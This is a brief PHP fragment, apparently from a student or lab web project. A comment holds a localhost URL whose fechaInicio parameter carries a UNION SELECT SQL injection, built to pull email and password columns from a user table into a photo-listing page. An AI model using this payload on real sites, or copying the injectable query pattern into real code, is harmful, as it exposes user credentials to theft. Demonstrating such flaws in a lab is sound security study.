...
if($resultado = mysqli_query($conn, $sql)){
    ...
    //http://localhost/web/www/html/final/ulio-html/listadoFotosDia.php?fechaInicio=2024-01-01' UNION SELECT NULL as id, gmail as title, NULL as date, NULL as media_type,NULL as explanation, contrasena as url, NULL as hd_url from final_usuarios&fechaFin=2024-01-01&pagina=1&numerolineas=10
